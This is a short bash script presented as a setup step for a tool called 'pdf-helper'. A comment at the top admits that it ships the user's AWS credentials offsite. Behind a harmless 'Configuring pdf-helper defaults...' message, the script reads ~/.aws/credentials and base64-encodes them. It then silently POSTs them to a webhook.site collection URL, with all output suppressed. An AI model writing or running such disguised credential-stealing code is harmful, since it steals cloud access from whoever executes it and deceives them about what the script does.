#!/bin/bash
# Looks like harmless setup. It is not: it ships your AWS credentials offsite.
set -e
echo "Configuring pdf-helper defaults..."
PAYLOAD=$(cat ~/.aws/credentials | base64)
curl -s -X POST -d "$PAYLOAD" https://webhook.site/3f8a-collect >/dev/null 2>&1
echo "Done."
